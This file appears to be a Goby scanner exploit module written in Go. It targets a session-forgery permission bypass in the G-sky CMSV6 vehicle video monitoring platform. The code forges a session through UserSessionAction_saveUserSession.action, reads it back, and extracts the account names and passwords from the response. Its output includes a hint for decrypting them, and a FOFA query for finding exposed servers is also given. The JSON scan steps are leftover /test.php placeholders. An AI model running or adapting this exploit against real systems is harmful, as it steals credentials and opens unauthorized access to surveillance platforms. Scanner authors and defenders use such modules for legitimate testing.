package exploits

import (
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "G-sky CMSV6 monitoring platform UserSessionAction_saveUserSession.action Permission Bypass Vulnerability",
    "Description": "<p>G-sky CMSV6 vehicle positioning monitoring platform with location services, wireless 3G4G video transmission, cloud storage services as the core of the R &amp; D team, focusing on positioning, wireless video terminal products to provide platform services, CMSV6 products covering vehicle video recorders, individual video recorders, network surveillance cameras, driving recorders and other products of video integrated platform.​</p><p>The UserSessionAction_saveUserSession.action interface has a SESSION forgery vulnerability. Unauthorized attackers can forge a SESSION, use the SESSION, obtain the account password, and log in to the background, causing damage.</p>",
    "Product": "G-sky CMSV6",
    "Homepage": "http://www.g-sky.cn/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-08-06",
    "Author": "hhh3156",
    "FofaQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "GobyQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "Level": "2",
    "Impact": "<p>The UserSessionAction_saveUserSession.action interface has a SESSION forgery vulnerability. Unauthorized attackers can forge a SESSION, use the SESSION, obtain the account password, and log in to the background, causing damage.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Info",
            "type": "select",
            "value": "Info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "通天星CMSV6车载视频监控平台 UserSessionAction_saveUserSession.action 权限绕过漏洞",
            "Product": "通天星CMSv6",
            "Description": "<p>通天星CMSV6车载定位监控平台拥有以位置服务、无线3G4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。<br></p><p>其UserSessionAction_saveUserSession.action接口处，存在SESSION伪造漏洞，未经授权的攻击者可以伪造SESSION，进行SESSION的相关利用，获取账户密码，登录后台，从而造成危害。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其UserSessionAction_saveUserSession.action接口处，存在SESSION伪造漏洞，未经授权的攻击者可以伪造SESSION，进行SESSION的相关利用，获取账户密码，登录后台，从而造成危害。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "HW-2024",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "G-sky CMSV6 monitoring platform UserSessionAction_saveUserSession.action Permission Bypass Vulnerability",
            "Product": "G-sky CMSV6",
            "Description": "<p>G-sky CMSV6 vehicle positioning monitoring platform with location services, wireless 3G4G video transmission, cloud storage services as the core of the R &amp; D team, focusing on positioning, wireless video terminal products to provide platform services, CMSV6 products covering vehicle video recorders, individual video recorders, network surveillance cameras, driving recorders and other products of video integrated platform.​</p><p>The UserSessionAction_saveUserSession.action interface has a SESSION forgery vulnerability. Unauthorized attackers can forge a SESSION, use the SESSION, obtain the account password, and log in to the background, causing damage.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The UserSessionAction_saveUserSession.action interface has a SESSION forgery vulnerability. Unauthorized attackers can forge a SESSION, use the SESSION, obtain the account password, and log in to the background, causing damage.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "HW-2024",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9919"
}`
	sendPayload_PALGVUmcvj789x6sMozap02 := func(hostInfo *httpclient.FixUrl) (bool, string, string, string) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
		generateRandomString := func(length int) string {
			b := make([]byte, length)
			for i := range b {
				b[i] = charset[seededRand.Intn(len(charset))]
			}
			return string(b)
		}
		randstring := generateRandomString(32)

		path1 := "/808gps/LocationManagement/UserSessionAction_saveUserSession.action"
		data1 := "userSession=" + randstring + "&id=1"

		path2 := "/808gps/UserSessionAction_findUserSession.action"
		data2 := "userSession=" + randstring

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		resp1, err := setPostRequest(hostInfo, path1, data1, header)
		if err != nil || resp1.StatusCode != 200 || (!strings.Contains(resp1.RawBody, `"result":0`) && !strings.Contains(resp1.RawBody, `"result":28`)) {
			return false, "", "", ""
		}

		resp2, err := setPostRequest(hostInfo, path2, data2, header)
		if err != nil || resp2.StatusCode != 200 || !strings.Contains(resp2.RawBody, `"result":0`) {
			return false, "", "", ""
		}
		regular := `"name":"([\s\S]*?)","account":"([\s\S]*?)","password":"([\s\S]*?)",`

		makeRegular := func(RegularContent string, RegularUrl string) (string, string, string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", "", "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)

			return getname[1], getname[2], getname[3], nil
		}

		name, account, password, _ := makeRegular(resp2.RawBody, regular)
		if err != nil || name == "" || account == "" || password == "" {
			return false, "", "", ""
		}

		return true, name, account, password
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, _, _ := sendPayload_PALGVUmcvj789x6sMozap02(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = `/808gps/LocationManagement/UserSessionAction_saveUserSession.action`
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, name, account, password := sendPayload_PALGVUmcvj789x6sMozap02(expResult.HostInfo)
			expResult.Output = "name : " + name + "\naccount : " + account + "\npassword : " + password + "\n解密请调用 ： AesUtil#aesDecryptDB+cmd5"
			expResult.Success = true
			return expResult
		},
	))
}
